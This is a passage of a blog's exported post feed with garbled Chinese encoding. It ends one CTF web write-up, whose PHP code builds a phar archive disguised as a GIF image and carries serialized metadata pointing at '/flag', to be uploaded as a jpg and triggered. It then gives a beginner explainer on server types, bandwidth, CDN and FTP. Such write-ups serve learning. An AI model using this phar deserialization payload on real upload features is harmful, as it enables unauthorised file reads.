class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$p</span>);<span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>è¦è¢«è‡ªå·±è ¢æ­»ï¼Œæ²¡æœ‰è¿è¡Œè„šæœ¬ç›´æ¥ä¸Šä¼ ï¼Œèƒ½å‡ºflagæ‰æ€ªï¼Œå¥½ä¸¢äººå•Šå•Šå•ŠğŸ˜­<br>è¿è¡Œè„šæœ¬åäº§ç”Ÿpharæ–‡ä»¶ï¼Œæ”¹æˆjpgæ ¼å¼ä¸Šä¼ ï¼Œç„¶åè®¿é—®ï¼Œå°±èƒ½å¾—åˆ°flag<br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108134720305.png"><br>å…¶ä¸­å¥½å¤šé¢˜éƒ½æ˜¯å¤§ä½¬æ•™ç»™æˆ‘åšçš„ï¼Œæ„Ÿè°¢ï¼Œtql  !ğŸ˜</p>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœåŠ¡å™¨åŸºæœ¬æ¦‚å¿µ</title>
      <link href="/archives/51925.html"/>
      <url>/archives/51925.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="æœåŠ¡å™¨çš„æ¦‚å¿µ"><a href="#æœåŠ¡å™¨çš„æ¦‚å¿µ" class="headerlink" title="æœåŠ¡å™¨çš„æ¦‚å¿µ"></a>æœåŠ¡å™¨çš„æ¦‚å¿µ</h2><p>æœåŠ¡å™¨æ˜¯è®¡ç®—æœºçš„ä¸€ç§ï¼Œæ‰¿æ‹…å“åº”æœåŠ¡è¯·æ±‚ï¼Œæ‰¿æ‹…æœåŠ¡ï¼Œä¿éšœæœåŠ¡èƒ½åŠ›ã€‚<strong>é€šä¿—çš„æ¥è®²å°±æ˜¯æˆ‘ä»¬çš„æœ¬åœ°ç”µè„‘ï¼Œé€šè¿‡è¿œç¨‹è¿›è¡Œæ§åˆ¶</strong>ï¼ˆå…¬ç½‘IPï¼‰ç¨³å®šæ€§è¦å¥½ã€‚</p><h2 id="æœåŠ¡å™¨çš„ä½œç”¨"><a href="#æœåŠ¡å™¨çš„ä½œç”¨" class="headerlink" title="æœåŠ¡å™¨çš„ä½œç”¨"></a>æœåŠ¡å™¨çš„ä½œç”¨</h2><p>é€šä¿—çš„æ¥è¯´ï¼ŒæœåŠ¡å™¨ä¸»è¦æ˜¯ç”¨æ¥å“åº”ç»ˆç«¯æœåŠ¡è¯·æ±‚ï¼Œå¹¶è¿›è¡Œå¤„ç†ã€‚æˆ‘ä»¬åœ¨ä¸Šç½‘çš„æ—¶å€™æ˜¯ä¸å¯èƒ½ç›´æ¥å°†ç½‘ç»œæ¥å…¥äº’è”ç½‘çš„ï¼Œæˆ‘ä»¬éƒ½éœ€è¦é€šè¿‡æœåŠ¡å™¨æ¥å…¥ç½‘ç»œçš„ï¼Œåªæœ‰æœåŠ¡å™¨å“åº”è”ç½‘è¯·æ±‚ï¼Œå¹¶è¿›è¡Œå¤„ç†åæ‰èƒ½è”ç½‘ï¼ŒæœåŠ¡å™¨çš„å­˜å‚¨ç©ºé—´æ¯”è¾ƒå……è¶³ï¼Œå¯ä»¥å­˜å‚¨éå¸¸å¤šçš„ä¿¡æ¯ã€‚</p><blockquote><p>ç›¸å½“äºä¸­ä»‹äººï¼Œé€šè¿‡å®ƒæ‰èƒ½è”ç½‘</p></blockquote><h2 id="æœåŠ¡å™¨çš„åˆ†ç±»"><a href="#æœåŠ¡å™¨çš„åˆ†ç±»" class="headerlink" title="æœåŠ¡å™¨çš„åˆ†ç±»"></a>æœåŠ¡å™¨çš„åˆ†ç±»</h2><h4 id="æŒ‰ç‰©ç†å½¢æ€ï¼š"><a href="#æŒ‰ç‰©ç†å½¢æ€ï¼š" class="headerlink" title="æŒ‰ç‰©ç†å½¢æ€ï¼š"></a>æŒ‰ç‰©ç†å½¢æ€ï¼š</h4><h5 id="æœåŠ¡å™¨ï¼šï¼ˆäº†è§£ï¼‰"><a href="#æœåŠ¡å™¨ï¼šï¼ˆäº†è§£ï¼‰" class="headerlink" title="æœåŠ¡å™¨ï¼šï¼ˆäº†è§£ï¼‰"></a>æœåŠ¡å™¨ï¼šï¼ˆäº†è§£ï¼‰</h5><p>å¯ä»¥ç†è§£ä¸ºæ”¾åœ¨è¿œç¨‹æœºæˆ¿çš„ç‹¬ç«‹è®¡ç®—æœºï¼Œå¯ä»¥è¿›è¡Œè¿œç¨‹è®¿é—®æ§åˆ¶ï¼Œå¯ä»¥è§£æç»‘å®šåŸŸåï¼Œå¹¶é€šè¿‡åŸŸåæˆ–ipè®¿é—®æœåŠ¡å™¨ä¸Šçš„ç½‘ç«™</p><h5 id="ECSæœåŠ¡å™¨ï¼š"><a href="#ECSæœåŠ¡å™¨ï¼š" class="headerlink" title="ECSæœåŠ¡å™¨ï¼š"></a>ECSæœåŠ¡å™¨ï¼š</h5><p><strong>å¾ˆå¤šç”¨æˆ·ç”¨åˆ°çš„ä¸€ç§</strong>  äº‘æœåŠ¡å™¨ï¼ˆEiastic Compute Service)çš„ä¸€ç§,ç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±éœ€è¦é€‰å®šä¸»æœºå®¹é‡ï¼ŒCPUèƒ½åŠ›ï¼Œå†…å­˜å¤§å°ï¼Œå¸¦å®½åŠè´­ä¹°æ—¶å¸¸ç­‰ï¼Œä¹Ÿç§°ä¸º<strong>å¼¹æ€§è®¡ç®—æœåŠ¡å™¨</strong>ï¼ŒESCåœ¨ä½¿ç”¨å’Œç‹¬ç«‹çš„æœåŠ¡å™¨æ²¡æœ‰åŒºåˆ«ï¼Œä¸”å¯ä»¥è®©ä¼ä¸šèŠ‚çœè‡ªè¡Œè´­ä¹°å’Œç»´æŠ¤æœåŠ¡å™¨ç¡¬ä»¶çš„æˆæœ¬ï¼ŒESCå·²è¢«ä¸­å°ä¼ä¸šå¹¿æ³›ä½¿ç”¨ã€‚</p><h5 id="VPSæœåŠ¡å™¨ï¼š"><a href="#VPSæœåŠ¡å™¨ï¼š" class="headerlink" title="VPSæœåŠ¡å™¨ï¼š"></a>VPSæœåŠ¡å™¨ï¼š</h5><p>è™šæ‹Ÿä¸“ç”¨æœåŠ¡å™¨ï¼ˆVirtual Private Serverï¼‰ï¼Œå³å°†ä¸€å°ç‹¬ç«‹æœåŠ¡å™¨é€šè¿‡è™šæ‹ŸæŠ€æœ¯åˆ†å‰²ä¸ºè‹¥å¹²ä¸ªè™šæ‹ŸæœåŠ¡å™¨(ä¸€ä¸ªåˆ†å¤šä¸ª)ï¼Œæ¯ä¸ªVPSå¯ä»¥ç‹¬ç«‹å®‰è£…ç³»ç»Ÿï¼Œæ‹¥æœ‰ç‹¬ç«‹çš„IPï¼Œå®ç°ä¸åŒVPSé—´ç£ç›˜ç©ºé—´ï¼Œå†…å­˜ï¼ŒCPUèµ„æºï¼Œè¿›ç¨‹å’Œç³»ç»Ÿé…ç½®çš„éš”ç¦»   ,VPSå¯ä»¥åƒç‹¬ç«‹æœåŠ¡å™¨ä¸€æ ·ï¼Œé‡è£…æ“ä½œç³»ç»Ÿï¼Œå®‰è£…ç¨‹åºï¼Œå•ç‹¬é‡å¯æœåŠ¡å™¨ï¼Œå½¢å¼ä¸Šå’ŒECSæ²¡æœ‰åŒºåˆ«ï¼Œä½†æ€»ä½“æ€§èƒ½å’Œçµæ´»æ€§ä¸å¦‚ECS.</p><h5 id="è™šæ‹Ÿä¸»æœºï¼š"><a href="#è™šæ‹Ÿä¸»æœºï¼š" class="headerlink" title="è™šæ‹Ÿä¸»æœºï¼š"></a>è™šæ‹Ÿä¸»æœºï¼š</h5><p>å³å°†ä¸€å°å·²å®‰è£…æ“ä½œç³»ç»Ÿå’Œå®‰å…¨é˜²èŒƒçš„æœåŠ¡å™¨é€šè¿‡æŠ€æœ¯æ‰‹æ®µåˆ†å‰²ä¸ºè‹¥å¹²ä¸ªç‹¬ç«‹çš„ç©ºé—´ï¼Œåˆ†é…ç»™ç”¨æˆ·ç‹¬ç«‹ä½¿ç”¨ï¼Œç”¨æˆ·åªéœ€è¦ä¸Šä¼ ç½‘ç«™ç¨‹åºï¼Œè§£æå’Œç»‘å®šåŸŸåå³å¯ä½¿ç”¨ã€‚è™šæ‹Ÿä¸»æœºä¸åŒäºæœåŠ¡å™¨ï¼Œç”¨æˆ·æ— æ³•å®‰è£…æ“ä½œç³»ç»Ÿå’Œæ“ä½œè½¯ä»¶ï¼Œåªèƒ½è¿è¡Œç½‘ç«™è„šæœ¬è¯­è¨€ï¼ŒHTMLæ–‡ä»¶ï¼Œå›¾ç‰‡åŠå…¶ä»–é™æ€æ–‡ä»¶ç­‰ã€‚ï¼ˆ<strong>åªèƒ½æ”¾è„šæœ¬è¯­è¨€ä½¿ç”¨</strong>ï¼‰è™šæ‹Ÿä¸»æœºç›¸å½“äºè‹¥å¹²ä¸ªç”¨æˆ·ä¸€èµ·ç§Ÿç”¨ä¸€å°æœåŠ¡å™¨ï¼Œä»·æ ¼å®æƒ ï¼Œç®€å•æ˜“ç”¨ï¼Œå› æ­¤å¤§å¤šæ•°ä¼ä¸šç½‘ç«™é€‰æ‹©äº†è™šæ‹Ÿä¸»æœºï¼Œè€Œè‡ªåŠ©å»ºç«™åŠäº‘å»ºç«™ä½¿ç”¨çš„ä¹Ÿæ˜¯è™šæ‹Ÿä¸»æœºã€‚ï¼ˆä¸éœ€è¦è‡ªå·±å»ç»´æŠ¤ï¼‰</p><h4 id="æŒ‰ç‰©ç†ä½ç½®åˆ†ç±»ï¼š"><a href="#æŒ‰ç‰©ç†ä½ç½®åˆ†ç±»ï¼š" class="headerlink" title="æŒ‰ç‰©ç†ä½ç½®åˆ†ç±»ï¼š"></a>æŒ‰ç‰©ç†ä½ç½®åˆ†ç±»ï¼š</h4><p>å›½å†…ä¸»æœº</p><p>å›½å¤–ä¸»æœº</p><ol><li>å¤‡æ¡ˆæ–¹é¢ï¼šå›½å†…ä¸»æœºå¿…é¡»å¤‡æ¡ˆï¼Œå›½å¤–ä¸»æœºä¸éœ€è¦æäº¤å¤‡æ¡ˆèµ„æ–™</li><li>è®¿é—®é€Ÿåº¦ï¼šå›½å†…ä¸»æœºå›½å†…è®¿é—®å¿«ï¼Œå›½å¤–ä¸»æœºå›½å¤–è®¿é—®é€Ÿåº¦å¿«</li><li>çº¿è·¯ï¼šå›½å†…ä¸»æœºæœ‰çº¿è·¯é™åˆ¶ï¼Œæµ·å¤–ä¸»æœºæ²¡æœ‰ï¼Œå›½å†…ä¸»æœºçº¿è·¯ä»¥è”é€šå’Œç”µä¿¡ä¸ºä¸»ï¼Œç›¸åŒçº¿è·¯è®¿é—®ä¸å­˜åœ¨é€Ÿåº¦é™åˆ¶ï¼Œä¸åŒåˆ™æœ‰</li></ol><h3 id="ï¼ˆæœåŠ¡å™¨ä¸»è¦è¿è¥å¹³å°ï¼‰"><a href="#ï¼ˆæœåŠ¡å™¨ä¸»è¦è¿è¥å¹³å°ï¼‰" class="headerlink" title="ï¼ˆæœåŠ¡å™¨ä¸»è¦è¿è¥å¹³å°ï¼‰"></a>ï¼ˆæœåŠ¡å™¨ä¸»è¦è¿è¥å¹³å°ï¼‰</h3><ol><li>é˜¿é‡Œäº‘  </li><li>è¥¿éƒ¨æ•°ç </li><li>è…¾è®¯äº‘</li><li>ç™¾åº¦äº‘</li><li>äº¬ä¸œäº‘</li></ol><h2 id="æœåŠ¡å™¨çš„å…³é”®å‚æ•°æŒ‡æ ‡"><a href="#æœåŠ¡å™¨çš„å…³é”®å‚æ•°æŒ‡æ ‡" class="headerlink" title="æœåŠ¡å™¨çš„å…³é”®å‚æ•°æŒ‡æ ‡*"></a>æœåŠ¡å™¨çš„å…³é”®å‚æ•°æŒ‡æ ‡*</h2><h3 id="æ“ä½œç³»ç»Ÿï¼š"><a href="#æ“ä½œç³»ç»Ÿï¼š" class="headerlink" title="æ“ä½œç³»ç»Ÿï¼š"></a>æ“ä½œç³»ç»Ÿï¼š</h3><h4 id="Windows-server"><a href="#Windows-server" class="headerlink" title="Windows server"></a>Windows server</h4><h4 id="NetWare"><a href="#NetWare" class="headerlink" title="NetWare"></a>NetWare</h4><h4 id="Unix"><a href="#Unix" class="headerlink" title="Unix"></a>Unix</h4><h4 id="Linux-ï¼ˆç›¸æ¯”Windowsç³»ç»Ÿè¿è¡Œæ•ˆç‡æ›´é«˜ï¼Œæ›´å®‰å…¨ï¼‰"><a href="#Linux-ï¼ˆç›¸æ¯”Windowsç³»ç»Ÿè¿è¡Œæ•ˆç‡æ›´é«˜ï¼Œæ›´å®‰å…¨ï¼‰" class="headerlink" title="Linux  ï¼ˆç›¸æ¯”Windowsç³»ç»Ÿè¿è¡Œæ•ˆç‡æ›´é«˜ï¼Œæ›´å®‰å…¨ï¼‰"></a>Linux  ï¼ˆ<strong>ç›¸æ¯”Windowsç³»ç»Ÿè¿è¡Œæ•ˆç‡æ›´é«˜ï¼Œæ›´å®‰å…¨</strong>ï¼‰</h4><p>ä¾‹å¦‚åˆ é™¤æ–‡ä»¶ï¼Œé£å¿«</p><h3 id="æ”¯æŒè„šæœ¬ï¼š"><a href="#æ”¯æŒè„šæœ¬ï¼š" class="headerlink" title="æ”¯æŒè„šæœ¬ï¼š"></a>æ”¯æŒè„šæœ¬ï¼š</h3><p>å³æ˜¯å¦ç½‘ç«™ç¨‹åºå¸¸è§çš„å¼€å‘è¯­è¨€ï¼Œä¸»è¦æœ‰aspåŠ.net,php,jsp,ä¸€èˆ¬éœ€è¦æ ¹æ®ç½‘ç«™ç¨‹åºæ‰€ä½¿ç”¨çš„å¼€å‘è¯­è¨€é€‰æ‹©ï¼Œæ”¯æŒçš„å¼€å‘è¯­è¨€è¶Šå°‘ä¸»æœºè¶Šå®‰å…¨å’Œé«˜æ•ˆã€‚</p><h3 id="ç©ºé—´å®¹é‡ï¼š"><a href="#ç©ºé—´å®¹é‡ï¼š" class="headerlink" title="ç©ºé—´å®¹é‡ï¼š"></a>ç©ºé—´å®¹é‡ï¼š</h3><p>å­˜æ”¾æ–‡ä»¶çš„ç©ºé—´å¤§å°ï¼Œä¼ä¸šç½‘ç«™ä¸€èˆ¬å¯ä»¥æ ¹æ®å›¾ç‰‡å’Œè§†é¢‘æ–‡ä»¶çš„å¤§å°æ¥é€‰æ‹©ï¼Œä»¥åŠä¸»æœºçš„ä½¿ç”¨å¹´é™ï¼Œä¸€èˆ¬1-5Gï¼ˆè™šæ‹Ÿä¸»æœºï¼‰å°±å¤Ÿäº†ï¼Œå†å¤§ä¸€ç‚¹å¯ä»¥é€‰æ‹©ä½¿ç”¨è‡ªå·±çš„æœåŠ¡å™¨</p><h3 id="ä¸»æœºå¸¦å®½ï¼š"><a href="#ä¸»æœºå¸¦å®½ï¼š" class="headerlink" title="ä¸»æœºå¸¦å®½ï¼š"></a>ä¸»æœºå¸¦å®½ï¼š</h3><p>å•ä½æ—¶é—´å†…ä¼ è¾“æ•°æ®çš„æ¦‚å¿µï¼Œå¸¦å®½è¶Šå¤§ï¼Œè®¿é—®é€Ÿåº¦è¶Šå¿«</p><h3 id="è®¿é—®æµé‡ï¼š"><a href="#è®¿é—®æµé‡ï¼š" class="headerlink" title="è®¿é—®æµé‡ï¼š"></a>è®¿é—®æµé‡ï¼š</h3><p>ç›¸å½“äºæ‰‹æœºä¸Šçš„æµé‡</p><h3 id="å¹¶å‘é‡ï¼š"><a href="#å¹¶å‘é‡ï¼š" class="headerlink" title="å¹¶å‘é‡ï¼š"></a>å¹¶å‘é‡ï¼š</h3><p>ç½‘ç«™åœ¨åŒä¸€æ—¶é—´è®¿é—®çš„äººæ•°ï¼Œäººæ•°è¶Šå¤§ï¼Œç¬é—´å¸¦å®½è¦æ±‚æ›´é«˜</p><h3 id="CPUå’Œå†…å­˜ï¼š"><a href="#CPUå’Œå†…å­˜ï¼š" class="headerlink" title="CPUå’Œå†…å­˜ï¼š"></a>CPUå’Œå†…å­˜ï¼š</h3><p>CPUä¸­å¤®å¤„ç†å™¨ï¼Œä»£è¡¨æœåŠ¡å™¨çš„è¿è¡Œè®¡ç®—èƒ½åŠ›ï¼Œä¹Ÿå°±æ˜¯å¯¹ç½‘ç«™ç¨‹åºçš„å“åº”é€Ÿåº¦å’Œæ•ˆç‡ï¼Œå¦‚æœåœ¨ä¸è€ƒè™‘æˆæœ¬çš„æƒ…å†µä¸‹ï¼Œå½“ç„¶æ˜¯CPUå¤šæ ¸ï¼Œå†…å­˜è¶Šå¤§æ€§èƒ½è¶Šé«˜ï¼Œä½†ä¼ä¸šç½‘ç«™çš„æ•°æ®æ˜¯æœ‰é™çš„ï¼Œä¸€èˆ¬åŒæ ¸ï¼Œ4Gå°±å¯ä»¥æ»¡è¶³åŸºæœ¬ä½¿ç”¨ã€‚</p><h3 id="æœåŠ¡å™¨IPç±»å‹ï¼šç‹¬ç«‹IPå’Œå…±äº«IP"><a href="#æœåŠ¡å™¨IPç±»å‹ï¼šç‹¬ç«‹IPå’Œå…±äº«IP" class="headerlink" title="æœåŠ¡å™¨IPç±»å‹ï¼šç‹¬ç«‹IPå’Œå…±äº«IP"></a>æœåŠ¡å™¨IPç±»å‹ï¼šç‹¬ç«‹IPå’Œå…±äº«IP</h3><p>1.ä»·æ ¼æ–¹é¢ï¼šå…±äº«IPè¦æ¯”ç‹¬ç«‹IPä¾¿å®œ.<br>2.é£é™©é—®é¢˜ï¼šå…±äº«IPæ˜“å—åˆ°å¤–æ¥ç½‘ç»œæ”»å‡»ï¼Œä¸”å…¶ä¸­ä¸€ä¸ªç½‘ç«™å‡ºç°é—®é¢˜å°±ä¼šæ³¢åŠå…¶ä»–ç«™ç‚¹ï¼Œè€Œç‹¬ç«‹IPå°±ä¸ä¼šå—åˆ°è¿™ç§è¿å¸¦æ³¢åŠé—®é¢˜ã€‚<br>3.æ”¶å½•å½±å“ï¼šç‹¬ç«‹IPæ›´æœ‰åˆ©äºè¢«æœç´¢å¼•æ“æ”¶å½•ï¼Œæƒé‡æ›´é«˜.<br>4.åŸŸåç»‘å®šåŒºåˆ«ï¼šç‹¬ç«‹IPå¯ä»¥å®ç°æ³›åŸŸåç»‘å®šï¼Œè€Œå…±äº«IPæ— æ³•å®ç°æ³›åŸŸåç»‘å®šï¼Œ<br>5.èƒ½å¦ç›´æ¥ä½¿ç”¨IPè®¿é—®ï¼šç‹¬ç«‹IPå¯ä»¥ç›´æ¥ä½¿ç”¨IPè®¿é—®ï¼Œå…±äº«IPä¸èƒ½ï¼Œè‹¥è®¿é—®å°±ä¼šæ”¶åˆ°æŠ¥é”™çš„æç¤ºã€‚</p><h3 id="æ‰©å±•æ€§èƒ½ï¼š"><a href="#æ‰©å±•æ€§èƒ½ï¼š" class="headerlink" title="æ‰©å±•æ€§èƒ½ï¼š"></a>æ‰©å±•æ€§èƒ½ï¼š</h3><p>æ”¯æŒè¯­è¨€ï¼Œæ˜¯å¦æ”¯æŒä¼ªé™æ€ï¼Œå­—ä½“ç­‰</p><h3 id="å®‰å…¨æ€§èƒ½ï¼š"><a href="#å®‰å…¨æ€§èƒ½ï¼š" class="headerlink" title="å®‰å…¨æ€§èƒ½ï¼š"></a>å®‰å…¨æ€§èƒ½ï¼š</h3><p>é˜²ç«å¢™ï¼Œï¼ˆé˜²æ­¢ddosæ”»å‡»äº§å“ï¼‰å·¥ä½œåŸç†å¼•æµ</p><p>æ•°æ®å¤‡ä»½ç­‰</p><h3 id="CDNï¼š"><a href="#CDNï¼š" class="headerlink" title="CDNï¼š"></a>CDNï¼š</h3><p>å°†æºç«™å†…å®¹å‘å¸ƒè‡³æœ€æ¥è¿‘ç”¨æˆ·çš„èŠ‚ç‚¹ï¼Œä½¿ç”¨æˆ·å¯å°±è¿‘æ¥æ”¶æ‰€è¦è·å–çš„å†…å®¹ï¼Œæé«˜ç”¨æˆ·çš„è®¿é—®å“åº”é€Ÿåº¦å’ŒæˆåŠŸç‡ã€‚</p><p>è§£å†³å› åˆ†å¸ƒï¼Œå¸¦å®½ï¼ŒæœåŠ¡å™¨æ€§èƒ½å¸¦æ¥çš„è®¿é—®å»¶è¿Ÿé—®é¢˜ï¼Œé€‚ç”¨äºç«™ç‚¹åŠ é€Ÿï¼Œç‚¹æ’­ï¼Œç›´æ’­ç­‰åœºæ™¯ã€‚</p><p>ä¸ƒç‰›äº‘ï¼Œcodingï¼Œåˆæ‹äº‘ç­‰</p><h2 id="å¦‚ä½•é€‰æ‹©æœåŠ¡å™¨ä¸»æœº"><a href="#å¦‚ä½•é€‰æ‹©æœåŠ¡å™¨ä¸»æœº" class="headerlink" title="å¦‚ä½•é€‰æ‹©æœåŠ¡å™¨ä¸»æœº"></a>å¦‚ä½•é€‰æ‹©æœåŠ¡å™¨ä¸»æœº</h2><p>é¦–å…ˆè¦æ˜ç™½è‡ªå·±çš„æœåŠ¡å™¨æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œæ˜¯æ”¾ç½‘ç«™è¿˜æ˜¯ç”¨æ¥æ­å»ºå±€åŸŸç½‘å’Œæ”¾ç½®æ¸¸æˆç­‰ï¼Œå°±çŸ¥é“æ€ä¹ˆé€‰æ‹©è‡ªå·±çš„æœåŠ¡å™¨ç±»å‹äº†ã€‚</p><p>1.æ ¹æ®ç½‘ç«™é€‰æ‹©æœåŠ¡å™¨æ”¯æŒè¯­è¨€ï¼Œä¸€å®šè¦åŒ¹é…ã€‚</p><p>ä¾‹å¦‚ï¼šPHPç½‘ç«™é€‰æ‹©PHPè¿è¡Œç¯å¢ƒçš„ä¸»æœº</p><p>2.æ ¹æ®ç½‘ç«™å—ä¼—é€‰æ‹©æœåŠ¡å™¨ç½‘ç»œ</p><p>å—ä¼—ç¾¤åœ¨å›½å†…é€‰æ‹©å›½å†…ä¸»æœºï¼Œå›½å¤–é€‰æ‹©å›½å¤–ä¸»æœº</p><p>3.æ ¹æ®ç½‘ç«™å†…å®¹é€‰æ‹©æœ€ä½æœåŠ¡å™¨å®¹é‡</p><p>4.åˆ¤æ–­æœåŠ¡å™¨å®‰å…¨æ€§èƒ½ï¼Œå“ç‰Œä¸æªæ–½</p><p>é€‰æ‹©çŸ¥ååº¦å¤§çš„ï¼Œé˜¿é‡Œäº‘ï¼Œè…¾è®¯äº‘ç­‰ï¼Œå®‰å…¨æ€§æœ‰ä¿éšœ</p><p>5.åˆ¤æ–­æœåŠ¡å™¨è´¨é‡</p><p>CPUè¿è¡Œå†…å­˜,å¸¦å®½ï¼Œå¹¶å‘é‡çš„å…³é”®æ€§å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°ä¼šç›´æ¥å½±å“åˆ°ç½‘ç«™çš„è¿è¡Œé€Ÿåº¦ä»¥åŠç½‘ç«™çš„ç¨³å®šæ€§ï¼ˆä¾¿å®œæ²¡å¥½è´§ï¼Œä¸€åˆ†ä»·é’±ä¸€åˆ†è´§ï¼‰</p><p>6.æ¯”è¾ƒä»·æ ¼ä¸æœåŠ¡</p><p>æœåŠ¡å™¨è‚¯å®šè¦æ¯”è™šæ‹Ÿä¸»æœºå¥½å„å¤§äº‘å¹³å°çš„ECSæœåŠ¡å™¨ï¼Œä½†æ˜¯è€ƒè™‘åˆ°æˆæœ¬ï¼Œä¸­å°ä¼ä¸šé€‰æ‹©è™šæ‹Ÿä¸»æœºè¶³å¤Ÿï¼Œä¸éœ€è¦è‡ªå·±ç»´æŠ¤ï¼Œæˆæœ¬ä¹Ÿå¤Ÿä½</p><hr><p>windowsè™šæ‹Ÿä¸»æœºè¿˜æ˜¯linuxè™šæ‹Ÿä¸»æœºå¥½ï¼Ÿ<br>ASPã€NETå¼€å‘çš„ç½‘ç«™åªèƒ½ä½¿ç”¨windowsè™šæ‹Ÿä¸»æœºï¼ŒPHPã€JSPå¼€å‘çš„ç½‘ç«™ä¸€èˆ¬å¯ä»¥å…¼å®¹windowsåˆ©linuxè™šæ‹Ÿä¸»æœºã€‚<br>è€Œlinuxæ“ä½œç³»ç»ŸæœåŠ¡å™¨åœ¨å®‰å…¨å’Œç¨³å®šæ€§èƒ½ã€å¤„ç†æ•ˆç‡ç­‰æ–¹é¢æœ‰ç€æ˜æ˜¾çš„ä¼˜åŠ¿ï¼Œå› æ­¤å¦‚æœä½ çš„ç½‘ç«™ç¨‹åºå¼€å‘è¯­è¨€æ˜¯PHPæˆ–JSPï¼Œåˆ™å»ºè®®é€‰æ‹©linuxè™šæ‹Ÿä¸»æœºã€‚<strong>é¦–é€‰Linuxä¸»æœº</strong></p><p>100Mbå…±äº«å¸¦å®½å’Œ2Mbç‹¬äº«å¸¦å®½å“ªä¸ªé€Ÿåº¦æ›´å¿«ï¼Ÿ</p><p>å¸¦å®½æ˜¯æœåŠ¡å™¨çš„æ ¸å¿ƒæŒ‡æ ‡ï¼Œä½†ç°å®ä½¿ç”¨ä¸­å¹¶ä¸æ˜¯å¸¦å®½è¶Šå¤§é€Ÿåº¦è¶Šå¿«ã€‚100Mbå…±äº«å¸¦å®½æ˜¯ä¸€å°æœåŠ¡å™¨ä¸Šæ‰€æœ‰ç½‘ç«™å…±äº«ï¼Œç›¸æ¯”è¾ƒè¿˜æ˜¯2Mbç‹¬äº«å¸¦å®½å¥½ï¼Œé€Ÿåº¦å’Œç¨³å®šæ€§éƒ½è¦å¥½å¾ˆå¤šã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œé€‰æ‹©cpu2æ ¸4Gï¼Œ3Mçš„å¸¦å®½é…ç½®æ€§èƒ½å°±å¤Ÿç”¨ï¼Œæœ€å¥½é€‰æ‹©Linuxç³»ç»Ÿ</p><h2 id="å¦‚ä½•ç®¡ç†æœåŠ¡å™¨ä¸»æœº"><a href="#å¦‚ä½•ç®¡ç†æœåŠ¡å™¨ä¸»æœº" class="headerlink" title="å¦‚ä½•ç®¡ç†æœåŠ¡å™¨ä¸»æœº"></a>å¦‚ä½•ç®¡ç†æœåŠ¡å™¨ä¸»æœº</h2><h3 id="FTPæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#FTPæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="FTPæ˜¯ä»€ä¹ˆï¼Ÿ"></a>FTPæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>FTP(File Transfer Protocol,æ–‡ä»¶ä¼ è¾“åè®®)ï¼Œæ˜¯TCP&#x2F;IPåè®®ç»„ä¸­çš„åè®®ä¹‹ä¸€ã€‚FTPåè®®åŒ…æ‹¬ä¸¤ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå…¶ä¸€ä¸ºFTPæœåŠ¡å™¨ï¼Œå…¶äºŒä¸ºFTPå®¢æˆ·ç«¯ã€‚</p><h3 id="æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"><a href="#æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ" class="headerlink" title="æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ"></a>æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ</h3><p>å¯¹äºå®¢æˆ·ç«¯ï¼šæ˜¯ä¸ºäº†å®¢æˆ·ç«¯é“¾æ¥ä¸»æœºæ¥ç®¡ç†è‡ªå·±çš„ä¸»æœºæ–‡ä»¶ï¼ˆä¸Šä¼ 